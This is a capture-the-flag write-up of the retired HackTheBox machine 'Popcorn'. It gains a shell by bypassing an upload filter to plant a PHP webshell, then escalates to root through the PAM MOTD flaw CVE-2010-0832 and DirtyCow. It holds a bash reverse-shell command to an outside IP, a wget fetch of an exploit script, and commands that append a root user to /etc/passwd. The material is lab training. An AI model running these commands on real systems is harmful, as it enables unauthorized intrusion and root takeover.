---
title: HTB: Popcorn
url: https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html
date: 2020-06-23T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-popcorn, hackthebox, ctf, nmap, ubuntu, karmic, gobuster, torrent-hoster, filter, webshell, php, upload, cve-2010-0832, arbitrary-write, passwd, dirtycow, ssh, oswe-like, htb-nineveh, oscp-like-v2
---

![Popcorn](https://0xdfimages.gitlab.io/img/popcorn-cover.png)

Popcorn was a medium box that, while not on TJ Null’s list, felt very OSCP-like to me. Some enumeration will lead to a torrent hosting system, where I can upload, and, bypassing filters, get a PHP webshell to run. From there, I will exploit CVE-2010-0832, a vulnerability in the linux authentication system (PAM) where I
can get it to make my current user the owner of any file on the system. There’s a slick exploit script, but I’ll show manually exploiting it as well. I’ll quickly also show DirtyCow since it does work here.

## Box Info

| Name | [Popcorn](https://hackthebox.com/machines/popcorn)  [Popcorn](https://hackthebox.com/machines/popcorn) [Play on HackTheBox](https://hackthebox.com/machines/popcorn) |
| --- | --- |
| Release Date | 15 Mar 2017 |
| Retire Date | 26 May 2017 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Popcorn |
| Radar Graph | Radar chart for Popcorn |
| First Blood User | 21 days10:31:24[adxn37 adxn37](https://app.hackthebox.com/users/32) |
| First Blood Root | 21 days12:18:45[adxn37 adxn37](https://app.hackthebox.com/users/32) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 11:36 EDT
Nmap scan report for 10.10.10.6
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.00 seconds

root@kali# nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 11:37 EDT
Nmap scan report for 10.10.10.6
Host is up (0.010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is running something older than Ubuntu Trusty 14.04. Some more Goolging shows [it’s from Ubuntu 9.10 Karmic](https://launchpad.net/ubuntu/karmic/i386/apache2.2-common/2.2.12-1ubuntu2).

### Website - TCP 80

#### Site

The site is just an old default page:

![image-20200621114758759](https://0xdfimages.gitlab.io/img/image-20200621114758759.png)

#### Directory Brute Force

I’ll run `gobuster` against the site:

```

root@kali# gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root-med -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.6
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/21 11:48:45 Starting gobuster
===============================================================
/test (Status: 200)
/index (Status: 200)
/torrent (Status: 301)
/rename (Status: 301)
[ERROR] 2020/06/21 11:49:39 [!] Get http://10.10.10.6/server-status: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
===============================================================
2020/06/21 11:50:27 Finished
===============================================================

```

#### /test

`/test` shows a PHPInfo page:

[![](https://0xdfimages.gitlab.io/img/image-20200621114938644.png)](https://0xdfimages.gitlab.io/img/image-20200621114938644.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200621114938644.png)

There is a bunch of information about how PHP is configured which can be useful in general, but I won’t need any of it here.

I’ll note that `file_uploads` are on:

![image-20200621115424749](https://0xdfimages.gitlab.io/img/image-20200621115424749.png)

This means that if I can find an LFI, I can likely get code execution, like I did in [Nineveh](/2020/04/22/htb-nineveh.html).

#### /rename

This looks like an API endpoint for renaming files:

![image-20200621115845409](https://0xdfimages.gitlab.io/img/image-20200621115845409.png)

I did some playing around trying to get this to work. I tried to rename `index.html` to `0xdf.html` at `http://10.10.10.6/rename/index.php?filename=index.html&newfilename=0xdf.html`. The error message seems to leak the path to this directory:

![image-20200621125729030](https://0xdfimages.gitlab.io/img/image-20200621125729030.png)

I couldn’t get it to rename anything useful. At this point I’m thinking that if I can find a place where I can upload a file but I need rename it, this could come in use. For example, if I can upload PHP code in a PNG file but only with a valid image extension, this might come in handy to then move the file to `.php` so the webserver will execute it.

#### /torrent

`/torrent` provides an instance of Torrent Hoster:

![image-20200621120228848](https://0xdfimages.gitlab.io/img/image-20200621120228848.png)

There’s an upload page, but it just redirects to the login form. There’s a Browse page, and it shows one torrent currently:

![image-20200621122823616](https://0xdfimages.gitlab.io/img/image-20200621122823616.png)

I tried some guesses at login, but then clicked the Sign up link:

![image-20200621120342052](https://0xdfimages.gitlab.io/img/image-20200621120342052.png)

It seems to work:

![image-20200621120358454](https://0xdfimages.gitlab.io/img/image-20200621120358454.png)

And I can log in:

![image-20200621120440900](https://0xdfimages.gitlab.io/img/image-20200621120440900.png)

Once logged in, I can get to the upload form:

![image-20200621120547278](https://0xdfimages.gitlab.io/img/image-20200621120547278.png)

I tried uploading a PHP webshell, but it errors:

![image-20200621120644079](https://0xdfimages.gitlab.io/img/image-20200621120644079.png)

I went to the [Kali download page](https://www.kali.org/downloads/) and grabbed a valid torrent file. When I submit that for upload, it hangs for a minute, and then reports success while it tries to redirect:

![image-20200621123058432](https://0xdfimages.gitlab.io/img/image-20200621123058432.png)

When I allow the redirect, I’m at the page for this torrent:

![image-20200621123221644](https://0xdfimages.gitlab.io/img/image-20200621123221644.png)

If I click “Edit this torren”, a new form pops up:

![image-20200621123353559](https://0xdfimages.gitlab.io/img/image-20200621123353559.png)

I can use this to upload the image associated with the torrent. If I provide it an image, It shows:

![image-20200621123501616](https://0xdfimages.gitlab.io/img/image-20200621123501616.png)

Looking at the torrent page, I see the uploaded image now. Looking at the HTML, the image is referred to by the following url:

```

http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/0ba973670d943861fb9453eecefd3bf7d3054713.png&maxw=96

```

I thought this could be a LFI, but it’s including the referenced file as an image, so even if I can traverse outside the current directory, it doesn’t really help.

Given the `src` looks like a path, I checked `http://10.10.10.6/torrent/upload/`, and it returned a directory listing including my uploaded image:

![image-20200621123746462](https://0xdfimages.gitlab.io/img/image-20200621123746462.png)

## Shell as www-data

### Test Filters

There are two opportunities to upload files here, the torrent and the image. I started with the image because I’m more comfortable with how an image looks. If I submit a simple php webshell, it returns “Invalid file”. There is some filtering going on that I’ll need to bypass.

I’ll find the allowed upload of a PNG in Burp and send it to Repeater. There are three common ways that a website will check for valid file types by comparing them to an allow- or deny-list:
- file extension
- `Content-Type` header
- [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

I’ll start by changing one at a time to see if the site blocks. First, I’ll change the extension to `.php`. It doesn’t seem to mind:

[![burp repeater with changed ext](https://0xdfimages.gitlab.io/img/image-20200621124500483.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200621124500483.png)

That is a real security vulnerability, because a server should never allow a user to upload anything that can be named `.php`, as then the server is likely to execute it as PHP code.

If I change the `Content-Type` header to `application/x-php`, it blocks it (even with the file name changed back to `.png`:

[![repeater with changed content-type](https://0xdfimages.gitlab.io/img/image-20200621124643359.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200621124643359.png)

Changing the content doesn’t seem to matter:

[![repeater with changed content](https://0xdfimages.gitlab.io/img/image-20200621124754152.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200621124754152.png)

### Upload

Based on the filter testing, it seems like I can name a file `.php` and include PHP code, as long as I change the `Content-Type` to a valid image.

[![webshell upload](https://0xdfimages.gitlab.io/img/image-20200621124856522.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200621124856522.png)

I’ll send it from Repeater (or I could upload the shell again through the form, and use Proxy to intercept the request and modify it).

When I check `/torrent/upload`, there is a PHP file there (seems to be named with a SHA1 hash of something):

![image-20200621125015779](https://0xdfimages.gitlab.io/img/image-20200621125015779.png)

And it gives execution:

```

root@kali# curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

To get a shell, I’ll start `nc` and pass `cmd` as a reverse shell:

```

root@kali# curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"

```

At `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.6.
Ncat: Connection from 10.10.10.6:33054.
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade the shell:

```

www-data@popcorn:/var/www/torrent/upload$ python -c 'import pty;pty.spawn("bash")'
www-data@popcorn:/var/www/torrent/upload$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo
root@kali# fg
                                                       reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@popcorn:/var/www/torrent/upload$

```

And this user can actually grab `user.txt`:

```

www-data@popcorn:/home/george$ cat user.txt
5e36a919************************

```

## Priv: www-data –> root

### Enumeration

Looking around the only home directory, `/home/george`, I’ll notice the file `.cache/motd.legal-displayed`:

```

www-data@popcorn:/home/george$ find . -type f -ls
    76    4 -rw-r--r--   1 george   george        220 Mar 17  2017 ./.bash_logout
    82    4 -rw-r--r--   1 george   george       3180 Mar 17  2017 ./.bashrc
 42885  832 -rw-r--r--   1 george   george     848727 Mar 17  2017 ./torrenthoster.zip
 42883    0 -rw-r--r--   1 george   george          0 Mar 17  2017 ./.cache/motd.legal-displayed
 42884    0 -rw-r--r--   1 george   george          0 Mar 17  2017 ./.sudo_as_admin_successful
  2210    4 -rw-r--r--   1 george   george         33 Mar 17  2017 ./user.txt
 43648    4 -rw-------   1 root     root           19 May  5  2017 ./.nano_history
 44232    4 -rw-------   1 root     root         1571 Mar 17  2017 ./.mysql_history
   499    4 -rw-------   1 root     root         2769 May  5  2017 ./.bash_history
   107    4 -rw-r--r--   1 george   george        675 Mar 17  2017 ./.profile

```

`motd.legal-displayed`. It’s currently empty, but it caught my interest because these kinds of files can lead to code execution because they are typically executed when a new session starts. Googling for “motd.legal-displayed privesc” returned an [Exploit-DB exploit](https://www.exploit-db.com/exploits/14339).

### Manual Exploit

#### Background

The script above is actually very well done and quite slick. I’ll show that at the end. But I wanted to understand the vulnerability. There isn’t a ton of detailed explanation on the web, but from reading the exploit script, the vulnerability is in how the `~/.cache` directory permissions are set when a user logs in (invokes the PAM module). My reverse shell didn’t trigger that because it isn’t a login. But I can use SSH to login by writing a key. Then, what the exploits do is remove the `~/.cache` directory, and replace it with a symbolic link to a file. Then, on logging in, that file will be owned by my user.

#### SSH as www-data

I can’t delete the `~/.cache` directory in george’s home directory because the `motd.legal-displayed` file is owned by george and not writable:

```

www-data@popcorn:/home/george$ rm -rf .cache/
rm: cannot remove `.cache/motd.legal-displayed': Permission denied
www-data@popcorn:/home/george$ ls -l .cache/motd.legal-displayed 
-rw-r--r-- 1 george george 0 Mar 17  2017 .cache/motd.legal-displayed

```

I can do this in the `www-data` directory. I’ll just need a way to log in. I’ll create a `.ssh` directory in www-data’s home directory, and generate an RSA key pair:

```

www-data@popcorn:/home/george$ cd ~
www-data@popcorn:/var/www$ mkdir .ssh
www-data@popcorn:/var/www$ ssh-keygen -q -t rsa -N '' -C 'pam'
Enter file in which to save the key (/var/www/.ssh/id_rsa): 
www-data@popcorn:/var/www$ ls .ssh/
id_rsa  id_rsa.pub

```

I’ll copy the public key into `authorized_keys` and set the permissions:

```

www-data@popcorn:/var/www$ cp .ssh/id_rsa.pub .ssh/authorized_keys
www-data@popcorn:/var/www$ chmod 600 .ssh/authorized_keys 

```

Now there isn’t a `.cache` in `/var/www`:

```

www-data@popcorn:/var/www$ ls -la                                                    
total 28                                                                             
drwxr-xr-x  4 www-data www-data 4096 Jun 21 21:39 .               
drwxr-xr-x 15 root     root     4096 Mar 17  2017 ..                                 
-rw-------  1 www-data www-data   44 Jun 21 21:39 .bash_history                      
-rw-r--r--  1 www-data www-data  177 Mar 17  2017 index.html    
drwxr-xr-x  2 www-data www-data 4096 Mar 17  2017 rename  
-rw-r--r--  1 www-data www-data   21 Mar 17  2017 test.php 
drwxr-xr-x 15 www-data www-data 4096 Mar 17  2017 torrent 

```

If I grab a copy of the private key, bring it back to my host, and then SSH to Popcorn as www-data, not only do I get a shell:

```

root@kali# ssh -i /tmp/key www-data@10.10.10.6
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

  System information as of Sun Jun 21 21:49:51 EEST 2020

  System load: 0.0               Memory usage: 5%   Processes:       111
  Usage of /:  6.2% of 14.80GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at https://landscape.canonical.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$

```

But the `.cache` directory shows up with a `motd.legal-displayed`:

```

www-data@popcorn:~$ find .cache/ -type f -ls
  4082    0 -rw-r--r--   1 www-data www-data        0 Jun 21 21:49 .cache/motd.legal-displayed

```

#### Get Write on passwd

I’ll clean up the `~/.cache` directory and replace it with a link to `/etc/sudoers`:

```

www-data@popcorn:~$ rm -rf .cache/
www-data@popcorn:/var/www$ ln -s /etc/passwd .cache
www-data@popcorn:/var/www$ ls -la .cache 
lrwxrwxrwx 1 www-data www-data 11 Jun 21 22:04 .cache -> /etc/passwd

```

Now I’ll log in again with SSH, and then `/etc/passwd` is owned by `www-data`:

```

www-data@popcorn:/var/www$ ls -l /etc/passwd
-rw-r--r-- 1 www-data www-data 1031 Mar 17  2017 /etc/passwd

```

#### Add Root Users

With write access, I’ll just add a root user. First, I need a password hash:

```

www-data@popcorn:/var/www$ openssl passwd -1 0xdf
$1$sWwJSjdl$vj3sfStwX82SUTKJDoYhI1

```

Now I’ll add a user to `/etc/passwd`:

```

www-data@popcorn:/var/www$ echo 'oxdf:$1$sWwJSjdl$vj3sfStwX82SUTKJDoYhI1:0:0:pwned:/root:/bin/bash' >> /etc/passwd  

```

The user is oxdf, the password is the hash of `0xdf`, the user and group ids are 0 for root, the description is pwned, the home directory is `/root`, and the shell is `/bin/bash`.

#### Shell

Now I can just `su` to oxdf to get a root shell:

```

www-data@popcorn:/var/www$ su - oxdf
Password: 
root@popcorn:~# id
uid=0(root) gid=0(root) groups=0(root)

```

And grab `root.txt`:

```

root@popcorn:~# cat root.txt
f1223310************************

```

### Script

#### Analysis

The [Exploid-DB script](https://www.exploit-db.com/exploits/14339) defines a bunch of functions, does some basic checks, and then runs this:

```

KEY="$(mktemp -u)"
key_create || { echo "[-] Failed to setup SSH key"; exit 1; }
backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }
own /etc/passwd && echo "$P" >> /etc/passwd
own /etc/shadow && echo "$S" >> /etc/shadow
restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }
key_remove
echo "[+] Success! Use password toor to get root"
su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
  chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1; bash" toor

```

`key_create` creates an SSH key and installs it into the current user’s home directory, being careful to backup whatever is already there.

`backup ~/.cache` will do just that - create a backup copy of the directory.

The `own` function is worth looking at:

```

own() {
    [ -e ~/.cache ] && rm -rf ~/.cache
    ln -s "$1" ~/.cache || return 1
    echo "[*] spawn ssh"
    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true
    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }
    echo "[+] owned: $1"
}

```

If `~/.cache` exists, it removes it. Then it creates the link to the file to target, which from the main body is first `/etc/passwd`, and then `/etc/shadow`. Then it runs SSH to connect to the box to run the `true` command and then disconnect. It verifies that it now has write permissions on the file.

So in each of the calls to `own`, it gets write access, and then adds a line, thus adding the user toor as a root user, just like I did manually.

Then it restores `.cache`, and cleans up the SSH key that was added.

Finally, it calls `su -c` with a long command to run as root for the user toor. When I enter that password, toor, it runs the command:
- remove the line for the toor user from both `/etc/passwd` and `/etc/shadow`;
- change the owner for both of those files to root;
- change the group of `/etc/shadow` to shadow;
- `nscd` is the caching daemon for name services, including `passwd`, and this [invalidates the cache](https://linux.die.net/man/8/nscd);
- runs `bash` to give a shell.

Basically it cleans up after itself, and then launches a shell.

#### Run

I gave the box a reset, re-uploaded a webshell, got a shell, with pty. Then I uploaded the script using a Python webserver (`python3 -m http.server 80`) and `wget`:

```

www-data@popcorn:/dev/shm$ wget 10.10.14.14/pam_motd.sh
--2020-06-21 22:28:38--  http://10.10.14.14/pam_motd.sh
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3043 (3.0K) [text/x-sh]
Saving to: `pam_motd.sh'

100%[======================================>] 3,043       --.-K/s   in 0.004s  

2020-06-21 22:28:38 (761 KB/s) - `pam_motd.sh' saved [3043/3043]

```

The script runs and returns a root shell:

```

www-data@popcorn:/dev/shm$ bash pam_motd.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/dev/shm#

```

### Dirty Cow

Given the age of this box, there are surely several kernel exploits to go after here. For example, `uname -a` shows it is running `2.6.31`:

```

root@popcorn:/dev/shm# uname -r
2.6.31-14-generic-pae

```

It’s likely vulnerable to [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions). The page for it has a [list of POCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs). I’ve had the best luck with `dirty.c`. I can grab [this code](https://github.com/FireFart/dirtycow/blob/master/dirty.c) and compile it on Popcorn:

```

www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt

```

Now run it:

```

www-data@popcorn:/dev/shm$ chmod +x dirty
www-data@popcorn:/dev/shm$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiek5FdMtod.2:0:0:pwned:/root:/bin/bash

mmap: b78a8000
^C

```

For some reason it hangs sometimes. After a minute, I’ll kill it. But the user is still added:

```

www-data@popcorn:/dev/shm$ su - firefart
Password: 
firefart@popcorn:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:~#

```